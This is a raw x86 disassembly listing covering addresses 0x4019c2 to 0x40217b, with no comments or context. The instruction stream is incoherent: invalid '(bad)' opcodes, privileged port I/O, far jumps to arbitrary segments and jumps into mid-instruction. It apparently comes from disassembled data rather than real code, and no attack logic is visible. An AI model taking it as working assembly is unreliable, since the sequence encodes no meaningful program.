  4019c2:	jg     0x4019ff
  4019c4:	bound  ebx,QWORD PTR [edi-0x4e8f1c3e]
  4019ca:	mov    bh,0x78
  4019cc:	pop    esp
  4019cd:	mov    edx,0x334c9652
  4019d2:	mov    eax,ds:0x896efa20
  4019d7:	sub    edi,DWORD PTR [ecx]
  4019d9:	xor    eax,0x74a20482
  4019de:	cld    
  4019df:	std    
  4019e0:	inc    esp
  4019e1:	and    al,0x85
  4019e3:	pop    esp
  4019e4:	inc    ebx
  4019e5:	nop
  4019e6:	xor    ebx,DWORD PTR [edx]
  4019e8:	pop    edi
  4019e9:	in     eax,dx
  4019ea:	cli    
  4019eb:	jp     0x401980
  4019ed:	(bad)  
  4019ee:	pop    eax
  4019ef:	rcr    dh,1
  4019f1:	jp     0x401a2b
  4019f3:	add    DWORD PTR [ebx-0x42442a8d],esi
  4019f9:	push   edi
  4019fa:	add    al,BYTE PTR [ebx]
  4019fc:	push   ds
  4019fd:	lock push eax
  4019ff:	mov    DWORD PTR [edx+edi*8],ebp
  401a02:	xchg   esp,eax
  401a03:	std    
  401a04:	clc    
  401a05:	sub    edx,DWORD PTR [edi-0x7b8a55a8]
  401a0b:	xor    al,0x19
  401a0d:	pop    eax
  401a0e:	in     eax,0xfc
  401a10:	or     eax,0x9c8d6130
  401a15:	neg    DWORD PTR [ebp+0xcd105c7]
  401a1b:	push   ebp
  401a1c:	call   0xf014:0x13580c6a
  401a23:	xchg   ebp,eax
  401a24:	inc    eax
  401a25:	stos   DWORD PTR es:[edi],eax
  401a26:	pushf  
  401a27:	not    al
  401a29:	or     DWORD PTR [edx+0x576fd3bb],0x35
  401a30:	sbb    esp,DWORD PTR [edx+0x370a13dd]
  401a36:	out    dx,al
  401a37:	sub    bh,ah
  401a39:	or     bh,BYTE PTR [eax-0x32]
  401a3c:	in     al,dx
  401a3d:	add    DWORD PTR [ecx+edi*8-0x46],esp
  401a41:	(bad)  
  401a42:	push   eax
  401a43:	mov    al,ds:0x3fa8963a
  401a48:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  401a4a:	dec    edi
  401a4b:	dec    eax
  401a4c:	push   eax
  401a4d:	xchg   esp,eax
  401a4e:	pop    es
  401a4f:	in     eax,0xe
  401a51:	outs   dx,BYTE PTR ds:[esi]
  401a52:	mov    bh,0xc5
  401a54:	add    edx,DWORD PTR [edi-0x15afda5]
  401a5a:	jnp    0x4019e9
  401a5c:	inc    ebx
  401a5d:	pop    es
  401a5e:	dec    esp
  401a5f:	jp     0x401a86
  401a61:	cs clc 
  401a63:	repz dec esi
  401a65:	test   al,0x61
  401a67:	inc    esp
  401a68:	cs mov eax,0x408ea932
  401a6e:	stos   BYTE PTR es:[edi],al
  401a6f:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  401a71:	retf   
  401a72:	adc    BYTE PTR [eax],dl
  401a74:	stos   DWORD PTR es:[edi],eax
  401a75:	add    DWORD PTR [ebx-0x4555cd03],eax
  401a7b:	or     bl,BYTE PTR [esp+ebp*1]
  401a7e:	push   ecx
  401a7f:	ss jnp 0x401af7
  401a82:	lock jo 0x401a7d
  401a85:	xchg   BYTE PTR [edi+0x17],bh
  401a88:	push   ds
  401a89:	mov    esp,ds
  401a8b:	jmp    0x401a12
  401a8d:	jge    0x401ad4
  401a8f:	xor    eax,DWORD PTR [ebp+0x327c791b]
  401a95:	call   0xde7e:0x6c163579
  401a9c:	push   eax
  401a9d:	in     al,dx
  401a9e:	ror    BYTE PTR [esi],0x4
  401aa1:	pmuludq mm1,QWORD PTR [ecx]
  401aa4:	nop
  401aa5:	cmp    DWORD PTR [edi+0x28336ae0],edx
  401aab:	and    DWORD PTR [edx],esp
  401aad:	ins    DWORD PTR es:[edi],dx
  401aae:	test   DWORD PTR [ecx],0x1fddada3
  401ab4:	into   
  401ab5:	imul   ecx,ebx,0x7b807993
  401abb:	gs js  0x401ae7
  401abe:	ins    DWORD PTR es:[edi],dx
  401abf:	sub    eax,0x738b6b20
  401ac4:	into   
  401ac5:	cmp    ecx,ebp
  401ac7:	ja     0x401a6a
  401ac9:	outs   dx,DWORD PTR ds:[esi]
  401aca:	pop    ss
  401acb:	addr16 fs push ebx
  401ace:	push   es
  401acf:	ins    DWORD PTR es:[edi],dx
  401ad0:	std    
  401ad1:	jge    0x401a9b
  401ad3:	test   BYTE PTR ds:0x6d9871ac,dl
  401ad9:	jmp    0x65395c63
  401ade:	xchg   edx,eax
  401adf:	mov    dl,0xa8
  401ae1:	cwde   
  401ae2:	jg     0x401ac8
  401ae4:	adc    al,0x16
  401ae6:	mov    al,0x1e
  401ae8:	fst    QWORD PTR [ecx+0x72]
  401aeb:	inc    esi
  401aec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401aed:	or     BYTE PTR [ecx],cl
  401aef:	stos   DWORD PTR es:[edi],eax
  401af0:	pop    esi
  401af1:	jo     0x401a85
  401af3:	and    DWORD PTR [ecx-0x29e1992c],eax
  401af9:	xor    ecx,DWORD PTR [ebx]
  401afb:	pushf  
  401afc:	(bad)  
  401afd:	xchg   ebp,eax
  401afe:	pop    ebp
  401aff:	pand   mm1,QWORD PTR [ebp+0x28]
  401b03:	fwait
  401b04:	jno    0x401ab6
  401b06:	sub    BYTE PTR [ecx-0x7ba10cf2],bh
  401b0c:	pop    esi
  401b0d:	push   0x88dc61a3
  401b12:	je     0x401b72
  401b14:	and    BYTE PTR [esi],dh
  401b16:	fmul   QWORD PTR [edx+0x33ce1f1e]
  401b1c:	ss push edi
  401b1e:	aas    
  401b1f:	scas   al,BYTE PTR es:[edi]
  401b20:	and    al,0x69
  401b22:	mov    dh,0x66
  401b24:	fiadd  DWORD PTR [edi-0x64]
  401b27:	jbe    0x401ac9
  401b29:	ja     0x401b9e
  401b2b:	push   eax
  401b2c:	lock pop esi
  401b2e:	jne    0x401ad3
  401b30:	pop    ss
  401b31:	pop    ss
  401b32:	add    bh,BYTE PTR [edx-0x29091ad3]
  401b38:	jp     0x401af6
  401b3a:	jmp    0x7acc:0x2126058c
  401b41:	sbb    al,0x64
  401b43:	mov    ebx,0x14d39da3
  401b48:	xor    DWORD PTR [edi+0x38],ebx
  401b4b:	mov    dl,0x2e
  401b4d:	loopne 0x401b5f
  401b4f:	jp     0x401b90
  401b51:	inc    ebp
  401b52:	retf   
  401b53:	jmp    0x401b38
  401b55:	xor    eax,0xfef3a567
  401b5a:	adc    eax,0x5c3832b5
  401b5f:	mov    ecx,0xcd411e8f
  401b64:	inc    edi
  401b65:	icebp  
  401b66:	mov    edx,0x308137b6
  401b6b:	shl    BYTE PTR ds:0x7f0c2947,0x6f
  401b72:	xchg   edx,eax
  401b73:	int3   
  401b74:	mov    dh,0x2a
  401b76:	inc    eax
  401b77:	punpcklbw mm1,mm4
  401b7a:	mov    al,0xcd
  401b7c:	fisubr DWORD PTR [ebx]
  401b7e:	jae    0x401bee
  401b80:	out    0x7f,eax
  401b82:	adc    dl,BYTE PTR [esi+0x1c]
  401b85:	imul   eax,esi,0xffffffb3
  401b88:	call   0x81627ef0
  401b8d:	rol    BYTE PTR [ebp+0x0],1
  401b90:	or     BYTE PTR [edi-0x173237ee],cl
  401b96:	push   ebp
  401b97:	addr16 cli 
  401b99:	(bad)
  401b9d:	loopne 0x401b34
  401b9f:	prefetch BYTE PTR [eax-0x2e5b5566]
  401ba6:	jae    0x401ba4
  401ba8:	sti    
  401ba9:	das    
  401baa:	jl     0x401b34
  401bac:	cmp    al,0x21
  401bae:	int    0x9e
  401bb0:	mov    ecx,0xce98cad9
  401bb5:	shl    BYTE PTR [eax+0x7],1
  401bb8:	fmulp  st(3),st
  401bba:	test   DWORD PTR [ecx+0x18],edx
  401bbd:	rol    edi,1
  401bbf:	adc    edx,edx
  401bc1:	or     BYTE PTR [ebx+ebp*4],bl
  401bc4:	loopne 0x401c02
  401bc6:	std    
  401bc7:	das    
  401bc8:	push   es
  401bc9:	ror    bh,1
  401bcb:	inc    ebx
  401bcc:	mov    dh,0x2d
  401bce:	stc    
  401bcf:	xor    ebx,DWORD PTR [ecx+edx*8-0x13]
  401bd3:	jo     0x401c35
  401bd5:	push   0x2607d26a
  401bda:	int3   
  401bdb:	lods   al,BYTE PTR ds:[esi]
  401bdc:	push   ecx
  401bdd:	mov    bh,0xcb
  401bdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401be0:	lea    ebp,[ebp-0x2a]
  401be3:	jne    0x401ba6
  401be5:	add    eax,0x54021b8d
  401bea:	cs sbb al,0x31
  401bed:	inc    edi
  401bee:	pop    ds
  401bef:	mov    ax,0xaf5f
  401bf3:	pop    esp
  401bf4:	mov    WORD PTR [ebx+0x25],ss
  401bf7:	scas   eax,DWORD PTR es:[edi]
  401bf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bf9:	lea    edx,[edx-0x7e1bb0d8]
  401bff:	sbb    bl,BYTE PTR [ebx-0x76]
  401c02:	cmp    DWORD PTR [ebp+0xfa5eeb7],0x4f6f957e
  401c0c:	shl    BYTE PTR [ebx+0x58bae78a],cl
  401c12:	arpl   dx,bx
  401c14:	push   0xffffff91
  401c16:	dec    ebp
  401c17:	xor    DWORD PTR [edi],0xcfec4a0
  401c1d:	dec    esi
  401c1e:	mov    bh,0x21
  401c20:	sbb    al,BYTE PTR [ebp+0x76]
  401c23:	enter  0x4d0a,0x8e
  401c27:	out    0xf4,al
  401c29:	mov    DWORD PTR [edi+0x7208d430],ebp
  401c2f:	push   cs
  401c30:	add    DWORD PTR [ecx],ecx
  401c32:	cmp    ch,BYTE PTR [eax-0x5b03d59c]
  401c38:	inc    eax
  401c39:	cld    
  401c3a:	dec    ecx
  401c3b:	push   ebp
  401c3c:	push   edi
  401c3d:	icebp  
  401c3e:	add    DWORD PTR [eax+0x444ca84e],edx
  401c44:	pushf  
  401c45:	(bad)  
  401c46:	adc    ebx,DWORD PTR [esi-0x41cd7090]
  401c4c:	push   cs
  401c4d:	jb     0x401c68
  401c4f:	add    BYTE PTR [ecx],0x2c
  401c52:	in     al,dx
  401c53:	call   0x17db2c4f
  401c58:	xchg   BYTE PTR [esi+edi*1],ch
  401c5b:	xchg   BYTE PTR gs:[ecx+0xb05a6fd],bl
  401c62:	mov    eax,ds:0x567fd2ee
  401c67:	sub    BYTE PTR [edx+0x6a],dl
  401c6a:	pop    esp
  401c6b:	fcom   st(4)
  401c6d:	jbe    0x401cec
  401c6f:	lea    ebx,[eax+0x43cae945]
  401c75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c76:	inc    edx
  401c77:	sahf   
  401c78:	jns    0x401ceb
  401c7a:	jbe    0x401c25
  401c7c:	mov    cs,WORD PTR [ebp*1+0x49e7f27b]
  401c83:	adc    DWORD PTR [esi-0x7e0b95c9],ebx
  401c89:	test   al,0x5e
  401c8b:	push   es
  401c8c:	test   DWORD PTR [ebx],ebx
  401c8e:	push   esp
  401c8f:	inc    edi
  401c90:	jno    0x401c18
  401c92:	pop    ecx
  401c93:	pop    ebx
  401c94:	pop    ecx
  401c95:	aad    0x96
  401c97:	stc    
  401c98:	in     al,0xdc
  401c9a:	or     edi,0xdca05cb1
  401ca0:	inc    eax
  401ca1:	mov    al,ds:0xbcf80ef8
  401ca6:	fild   QWORD PTR [edx+edi*4+0x3e]
  401caa:	push   ebx
  401cab:	or     DWORD PTR [ecx+ebx*2+0x74454f14],eax
  401cb2:	sahf   
  401cb3:	jmp    0x80c4:0x3bb269c6
  401cba:	mov    ds:0x7b6a7eb6,eax
  401cbf:	inc    ebx
  401cc0:	xchg   esp,eax
  401cc1:	arpl   WORD PTR [eax+ebx*2+0x78f6ba76],si
  401cc8:	loope  0x401c98
  401cca:	stos   BYTE PTR es:[edi],al
  401ccb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ccc:	xchg   ecx,eax
  401ccd:	xor    bh,ah
  401ccf:	push   edi
  401cd0:	daa    
  401cd1:	daa    
  401cd2:	push   esp
  401cd3:	mov    dl,0x77
  401cd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cd6:	ins    DWORD PTR es:[edi],dx
  401cd7:	scas   eax,DWORD PTR es:[edi]
  401cd8:	scas   al,BYTE PTR es:[edi]
  401cd9:	jnp    0x401c85
  401cdb:	fld    QWORD PTR [ecx-0x33]
  401cde:	lds    esp,FWORD PTR [edi+0x4e]
  401ce1:	jmp    0x401cca
  401ce3:	jne    0x401cb7
  401ce5:	in     eax,dx
  401ce6:	retf   0xc382
  401ce9:	inc    ecx
  401cea:	adc    DWORD PTR [esi+ebp*4+0x511dc15d],0xc507420a
  401cf5:	sti    
  401cf6:	int    0x13
  401cf8:	and    al,0x89
  401cfa:	add    al,0xf8
  401cfc:	dec    edx
  401cfd:	sub    eax,0x9a67b5af
  401d02:	ja     0x401cc4
  401d04:	retf   0xe218
  401d07:	dec    esi
  401d08:	inc    ebp
  401d09:	push   edx
  401d0a:	stos   DWORD PTR es:[edi],eax
  401d0b:	dec    esp
  401d0c:	in     eax,dx
  401d0d:	pop    esi
  401d0e:	jl     0x401d58
  401d10:	jp     0x401ccd
  401d12:	jl     0x401d71
  401d14:	lahf   
  401d15:	push   ebx
  401d16:	pop    esp
  401d17:	rol    bh,1
  401d19:	add    eax,0x4dae2363
  401d1e:	cmp    al,0xc4
  401d20:	pop    edx
  401d21:	ret    
  401d22:	dec    edi
  401d23:	test   BYTE PTR [ebx-0x63],0xd0
  401d27:	xchg   edx,eax
  401d28:	loope  0x401d16
  401d2a:	fist   WORD PTR [edx-0x12]
  401d2d:	xchg   BYTE PTR ds:0x10220101,dh
  401d33:	adc    esp,ecx
  401d35:	jns    0x401d17
  401d37:	mov    ecx,DWORD PTR [ecx]
  401d39:	xchg   edx,eax
  401d3a:	mov    eax,ds:0x179b4614
  401d3f:	lahf   
  401d40:	(bad)  
  401d41:	mov    ch,0xe2
  401d43:	adc    dl,BYTE PTR [esi-0x722ad67d]
  401d49:	pop    esi
  401d4a:	jbe    0x401d3c
  401d4c:	imul   ecx,DWORD PTR [ebx+0x14],0xffffffd0
  401d50:	inc    esp
  401d51:	jae    0x401d13
  401d53:	popf   
  401d54:	test   eax,0x8beeb7fe
  401d59:	pop    fs
  401d5b:	cmp    BYTE PTR [ebp+0x7f64d02d],cl
  401d61:	mov    ebx,0x33fa83c4
  401d66:	retf   
  401d67:	in     al,dx
  401d68:	and    al,0x5b
  401d6a:	jb     0x401dd6
  401d6c:	clc    
  401d6d:	push   0xe49a7f94
  401d72:	ja     0x401d32
  401d74:	push   edx
  401d75:	sar    DWORD PTR [ebx],1
  401d77:	xchg   edx,eax
  401d78:	cwde   
  401d79:	shl    BYTE PTR [edi+0x1b],0x46
  401d7d:	pusha  
  401d7e:	inc    edx
  401d7f:	cmp    ch,BYTE PTR [eax+0x47]
  401d82:	adc    al,0xed
  401d84:	add    DWORD PTR [ebx-0x4d02fe6f],ebx
  401d8a:	retf   
  401d8b:	dec    edx
  401d8c:	inc    edi
  401d8d:	ss shl DWORD PTR gs:[eax+0x38],1
  401d92:	(bad)  
  401d93:	xor    esp,edx
  401d95:	les    ebp,FWORD PTR [eax+0x1]
  401d98:	in     eax,0xda
  401d9a:	dec    esp
  401d9b:	test   ah,dh
  401d9d:	clc    
  401d9e:	stos   BYTE PTR es:[edi],al
  401d9f:	adc    BYTE PTR [eax],ch
  401da1:	dec    eax
  401da2:	test   BYTE PTR [eax-0x5f],bh
  401da5:	out    0xd9,al
  401da7:	fadd   DWORD PTR [edx]
  401da9:	push   eax
  401daa:	popa   
  401dab:	and    eax,0xe22dd8bb
  401db0:	mov    cl,0x3c
  401db2:	cld    
  401db3:	push   cs
  401db4:	jns    0x401dff
  401db6:	and    esp,DWORD PTR [edi-0xe34fd0b]
  401dbc:	sar    edi,0xdb
  401dbf:	lock rcl cl,1
  401dc2:	fdivrp st(7),st
  401dc4:	fistp  WORD PTR [esi]
  401dc6:	(bad)  
  401dc7:	not    DWORD PTR [eax-0x1a17d239]
  401dcd:	cmp    ch,BYTE PTR [ecx]
  401dcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401dd0:	sti    
  401dd1:	cmp    DWORD PTR [ecx-0x7],edi
  401dd4:	xchg   ebx,eax
  401dd5:	loope  0x401dd8
  401dd7:	push   esp
  401dd8:	inc    ebp
  401dd9:	stc    
  401dda:	jl     0x401def
  401ddc:	inc    ebp
  401ddd:	pop    esp
  401dde:	inc    edx
  401ddf:	xchg   BYTE PTR [esi-0x45c1b84],ah
  401de5:	adc    al,0x3f
  401de7:	and    dh,dl
  401de9:	xor    DWORD PTR [esi-0x7fea8116],edi
  401def:	in     eax,0xfd
  401df1:	sub    DWORD PTR [edi+ebx*4],esp
  401df4:	inc    ecx
  401df5:	bound  ebx,QWORD PTR [eax]
  401df7:	addr16 enter 0x3e3a,0x95
  401dfc:	xchg   dl,bl
  401dfe:	test   cl,0xde
  401e01:	mov    cl,0x85
  401e03:	arpl   WORD PTR [ebx-0x2d3133c0],dx
  401e09:	cwde   
  401e0a:	inc    eax
  401e0b:	stos   DWORD PTR es:[edi],eax
  401e0c:	xchg   edi,eax
  401e0d:	xor    dl,bh
  401e0f:	sbb    al,0x37
  401e11:	in     eax,0x69
  401e13:	mov    ch,0x39
  401e15:	(bad)  
  401e16:	inc    BYTE PTR [ecx-0x3395bc88]
  401e1c:	lds    eax,FWORD PTR [ebp-0x73]
  401e1f:	je     0x401dbe
  401e21:	xchg   ebp,eax
  401e22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e23:	or     ebp,ecx
  401e25:	mov    ds:0x6db93999,eax
  401e2a:	pop    edi
  401e2b:	jns    0x401e13
  401e2d:	adc    al,0x47
  401e2f:	pop    esi
  401e30:	jbe    0x401e24
  401e32:	pop    ds
  401e33:	in     eax,dx
  401e34:	jl     0x401e41
  401e36:	std    
  401e37:	fsub   DWORD PTR [ecx-0x2f609f9d]
  401e3d:	push   ecx
  401e3e:	mov    edx,0x572a2ee7
  401e43:	aam    0x97
  401e45:	jo     0x401e47
  401e47:	neg    eax
  401e49:	das    
  401e4a:	mov    WORD PTR [ecx+0x47],fs
  401e4d:	adc    al,0x8b
  401e4f:	push   esi
  401e50:	mov    ah,0xc6
  401e52:	adc    edi,eax
  401e54:	jne    0x401e74
  401e56:	mov    ds:0x3960072d,al
  401e5b:	(bad)  
  401e5c:	cmp    ebx,DWORD PTR [esi+ecx*4+0x1c]
  401e60:	(bad)  
  401e61:	js     0x401ebc
  401e63:	and    DWORD PTR [edi+eax*2+0x3a8c7f75],ebx
  401e6a:	mov    cl,0xa0
  401e6c:	mov    ebp,0x2cf56daf
  401e71:	jecxz  0x401edd
  401e73:	dec    esp
  401e74:	loop   0x401e6f
  401e76:	xchg   edx,eax
  401e77:	jp     0x401ed3
  401e79:	dec    ebx
  401e7a:	cmp    DWORD PTR [ecx],ebx
  401e7c:	into   
  401e7d:	in     eax,dx
  401e7e:	pop    es
  401e7f:	xor    eax,0xc8052979
  401e84:	push   eax
  401e85:	cdq    
  401e86:	ja     0x401e42
  401e88:	fbstp  TBYTE PTR [ecx]
  401e8a:	mov    edx,0x1c506f3e
  401e8f:	add    al,0xd2
  401e91:	sub    eax,0xcaf6d61e
  401e96:	ret    
  401e97:	sar    BYTE PTR [ecx+0x76a6acc],1
  401e9d:	icebp  
  401e9e:	call   0xc5dae806
  401ea3:	call   0xb6eebc0
  401ea8:	jecxz  0x401eef
  401eaa:	or     al,BYTE PTR [eax-0x7]
  401ead:	add    DWORD PTR [eax*2-0x684e8657],ebx
  401eb4:	xor    eax,0x3b83598a
  401eb9:	shr    DWORD PTR [edx+0x7a47e684],0x43
  401ec0:	push   edx
  401ec1:	sub    edx,DWORD PTR [ebx+0x80ea582]
  401ec7:	adc    ecx,ebp
  401ec9:	repnz in eax,dx
  401ecb:	pop    edx
  401ecc:	loope  0x401eec
  401ece:	ror    BYTE PTR [ebx+0x10],cl
  401ed1:	or     eax,0xbfef749e
  401ed6:	dec    edx
  401ed7:	jbe    0x401e9d
  401ed9:	(bad)  
  401edb:	cdq    
  401edc:	cli    
  401edd:	jge    0x401f2d
  401edf:	arpl   WORD PTR [ecx-0x4e],di
  401ee2:	inc    esp
  401ee3:	add    ebx,eax
  401ee5:	inc    esi
  401ee6:	sbb    eax,0x6dfbf562
  401eeb:	adc    eax,0xf94d90a
  401ef0:	xor    BYTE PTR [esi+0x3241df9c],ch
  401ef6:	(bad)  
  401ef7:	out    0x96,al
  401ef9:	sub    eax,0x2d52ad50
  401efe:	stc    
  401eff:	mov    ebx,0xf2ce036c
  401f04:	enter  0x9cd8,0xf5
  401f08:	data16 int3 
  401f0a:	xor    ah,al
  401f0c:	lock hlt 
  401f0e:	xchg   edi,eax
  401f0f:	inc    ebp
  401f10:	retf   0xe9ab
  401f13:	mov    ds:0x283eaec5,eax
  401f18:	out    dx,al
  401f19:	mov    edx,0x7b35ab5c
  401f1e:	or     ah,BYTE PTR [ebx+0x752d66e8]
  401f24:	mov    esi,DWORD PTR [esi]
  401f26:	push   ecx
  401f27:	(bad)  
  401f28:	mov    al,ds:0x16184919
  401f2d:	jne    0x401f59
  401f2f:	xchg   esi,eax
  401f30:	fisttp WORD PTR [ecx]
  401f32:	xor    DWORD PTR [edx+ebx*4-0x31],edx
  401f36:	push   ss
  401f37:	and    eax,0xde03fcc2
  401f3c:	mov    bh,0x79
  401f3e:	fadd   st(0),st
  401f40:	mov    ah,0xeb
  401f42:	scas   al,BYTE PTR es:[edi]
  401f43:	or     ebp,DWORD PTR ss:[eax-0x47]
  401f47:	xchg   edi,eax
  401f48:	jg     0x401f6a
  401f4a:	enter  0xe9c0,0xea
  401f4e:	mov    al,0x5b
  401f50:	push   edx
  401f51:	mov    bh,0x4e
  401f53:	push   es
  401f54:	loope  0x401f1b
  401f56:	mov    al,0xe0
  401f58:	jmp    0x6ae4:0x54446661
  401f5f:	mov    esp,cs
  401f61:	jmp    0x3c09:0x3f059098
  401f68:	xor    ebx,DWORD PTR [edx]
  401f6a:	mov    al,0x8f
  401f6c:	scas   al,BYTE PTR es:[edi]
  401f6d:	int3   
  401f6e:	xchg   BYTE PTR [esp+ecx*1-0xe497f34],bl
  401f75:	push   es
  401f76:	in     eax,0x76
  401f78:	pusha  
  401f79:	add    eax,0x77d554b7
  401f7e:	push   0x91ac5395
  401f83:	pusha  
  401f84:	pushf  
  401f85:	in     al,0xe5
  401f87:	adc    BYTE PTR fs:[ebp-0x51],cl
  401f8b:	push   cs
  401f8c:	loopne 0x401f18
  401f8e:	mov    bh,BYTE PTR [ebx]
  401f90:	std    
  401f91:	fldcw  WORD PTR ds:0xd6721120
  401f97:	fsub   DWORD PTR [eax+0x48b19f05]
  401f9d:	jmp    0xf3a1:0x928b7bb7
  401fa4:	sbb    DWORD PTR [eax+0x2266b762],eax
  401faa:	jno    0x401fe1
  401fac:	adc    DWORD PTR [eax+0x42],0x555e527e
  401fb3:	aam    0x7f
  401fb5:	(bad)  [ebp-0x2ab2c3c2]
  401fbb:	sbb    DWORD PTR [esi-0x6a82b7e4],ebx
  401fc1:	push   esp
  401fc2:	je     0x401fe8
  401fc4:	cdq    
  401fc5:	mov    edx,0xa0ab992a
  401fca:	jo     0x401f56
  401fcc:	inc    esp
  401fcd:	pop    esi
  401fce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fcf:	mov    ecx,0xc8437dcb
  401fd4:	or     ah,BYTE PTR [ebx-0x11]
  401fd7:	xor    eax,0xc2bf8202
  401fdc:	and    dl,al
  401fde:	pushf  
  401fdf:	cmp    BYTE PTR [ebp+0x1cc48cbc],bh
  401fe5:	cmp    BYTE PTR [edx+0x44],bl
  401fe8:	das    
  401fe9:	inc    edx
  401fea:	inc    edi
  401feb:	cdq    
  401fec:	repnz xchg esi,eax
  401fee:	lahf   
  401fef:	fsub   st(1),st
  401ff1:	jns    0x401ffd
  401ff3:	pop    edi
  401ff4:	sbb    eax,0x7eace344
  401ff9:	sar    DWORD PTR [edx+0x5c92d708],cl
  401fff:	add    al,0xdb
  402001:	cs iret 
  402003:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402004:	mov    ebp,0x15790f5a
  402009:	retf   0xd2e7
  40200c:	push   es
  40200d:	jo     0x401fb9
  40200f:	pop    ebp
  402010:	inc    ebp
  402011:	pop    ss
  402012:	aam    0x99
  402014:	js     0x402084
  402016:	sti    
  402017:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402018:	inc    ecx
  402019:	ret    0xe22a
  40201c:	jle    0x40207d
  40201e:	(bad)  
  40201f:	jae    0x401fbe
  402021:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402022:	jmp    0xcb1e660b
  402027:	test   eax,0x37e93c28
  40202c:	mov    esi,DWORD PTR [edi+0x6d]
  40202f:	fisttp QWORD PTR [eax]
  402031:	sbb    ecx,DWORD PTR [ecx]
  402033:	cld    
  402034:	std    
  402035:	retf   
  402036:	push   0xd670551a
  40203b:	push   esp
  40203c:	jne    0x402022
  40203e:	arpl   WORD PTR [edi+0x1d],si
  402041:	data16 loopne 0x402069
  402044:	xchg   edi,eax
  402045:	or     cl,ah
  402047:	into   
  402048:	in     eax,dx
  402049:	lds    ecx,FWORD PTR [edi-0x7e]
  40204c:	in     eax,dx
  40204d:	fld    QWORD PTR [ecx]
  40204f:	sub    eax,DWORD PTR [edx+esi*8]
  402052:	jmp    0x402029
  402054:	aaa    
  402055:	xlat   BYTE PTR ds:[ebx]
  402056:	add    edi,esp
  402058:	sub    ecx,DWORD PTR [ecx-0x27a53bb2]
  40205e:	lock call 0x8e57:0xad920f5c
  402066:	jns    0x401ffa
  402068:	sahf   
  402069:	adc    al,0x83
  40206b:	or     bh,BYTE PTR [esi+eiz*4]
  40206e:	mov    ch,0x98
  402070:	push   0xeab8bec8
  402075:	pop    ebx
  402076:	jmp    0xa4e782df
  40207b:	sub    eax,0xc7e43d9f
  402080:	adc    al,BYTE PTR [ecx+0x5375fc19]
  402086:	dec    esi
  402087:	xor    eax,0x14707402
  40208c:	out    dx,al
  40208d:	push   ebx
  40208e:	ins    BYTE PTR es:[edi],dx
  40208f:	daa    
  402090:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  402092:	fld    QWORD PTR [eax]
  402094:	hlt    
  402095:	jo     0x40205c
  402097:	outs   dx,DWORD PTR ds:[esi]
  402098:	shr    DWORD PTR [ebx],cl
  40209a:	add    al,0xd6
  40209c:	add    DWORD PTR [ebx-0x40848475],edi
  4020a2:	mov    esi,0x99276b3a
  4020a7:	push   0x52
  4020a9:	jns    0x4020dd
  4020ab:	mov    ecx,0x15224729
  4020b0:	loop   0x402041
  4020b2:	hlt    
  4020b3:	icebp  
  4020b4:	mov    ds:0x9bfb9c1,eax
  4020b9:	mov    ecx,0xc23342c1
  4020be:	jbe    0x402126
  4020c0:	(bad)  
  4020c1:	mul    ecx
  4020c3:	cdq    
  4020c4:	and    esi,edi
  4020c6:	xchg   ebx,eax
  4020c7:	mov    ebx,0xf635809
  4020cc:	jo     0x402107
  4020ce:	adc    cl,dh
  4020d0:	cdq    
  4020d1:	mov    cl,0x80
  4020d3:	ja     0x402133
  4020d5:	lahf   
  4020d6:	jl     0x40212b
  4020d8:	push   esp
  4020d9:	pop    edx
  4020da:	xor    BYTE PTR [ebp+0x78],ch
  4020dd:	add    bh,ch
  4020df:	sti    
  4020e0:	dec    ebp
  4020e1:	mov    ah,dh
  4020e3:	jmp    FWORD PTR [ecx-0x5cf5a7b2]
  4020e9:	jecxz  0x4020fe
  4020eb:	cdq    
  4020ec:	test   BYTE PTR [edx],ch
  4020ee:	and    bl,al
  4020f0:	pop    esi
  4020f1:	dec    esp
  4020f2:	sub    BYTE PTR [ebx-0x387b2e33],ch
  4020f8:	jno    0x402141
  4020fa:	sbb    eax,0xd9dd763c
  4020ff:	cmp    bh,BYTE PTR [esi-0x89e9a6a]
  402105:	call   0xb995b9af
  40210a:	in     eax,0x24
  40210c:	into   
  40210d:	leave  
  40210e:	or     eax,0xea78e921
  402113:	aam    0xd9
  402115:	jo     0x402115
  402117:	mov    ah,0x95
  402119:	dec    esi
  40211a:	mul    ecx
  40211c:	push   cs
  40211d:	xor    eax,0xf0cb9ff9
  402122:	jnp    0x402150
  402124:	dec    edx
  402125:	fs and bh,dh
  402128:	push   ebx
  402129:	jl     0x402191
  40212b:	lahf   
  40212c:	dec    ebp
  40212d:	mov    eax,ds:0x4297f1c0
  402132:	adc    DWORD PTR [ebx+0x62],esp
  402135:	imul   eax,DWORD PTR gs:[ecx+eiz*1-0x6f179684],0x42
  40213e:	xchg   esi,eax
  40213f:	dec    eax
  402140:	sbb    dl,BYTE PTR [edx+0x11]
  402143:	fwait
  402144:	mov    DWORD PTR [esi-0x57],edx
  402147:	push   edi
  402148:	push   ebp
  402149:	test   BYTE PTR [edi-0x7e7a7d72],dh
  40214f:	add    ebx,DWORD PTR [edx-0x67]
  402152:	popf   
  402153:	cld    
  402154:	lahf   
  402155:	out    dx,al
  402156:	mov    ecx,fs
  402158:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402159:	jp     0x402186
  40215b:	jmp    0x40214a
  40215d:	pop    esi
  40215e:	cmp    BYTE PTR cs:[edi-0xb596157],dh
  402165:	scas   al,BYTE PTR es:[edi]
  402166:	and    bh,bl
  402168:	pop    edi
  402169:	jmp    0x430d:0xe2c9deba
  402170:	xchg   DWORD PTR [ebp-0x7],eax
  402173:	mov    ecx,0xb8abf77b
  402178:	jge    0x40218d
  40217a:	stos   DWORD PTR es:[edi],eax
  40217b:	test   DWORD PTR es:[eax+0x44],edx
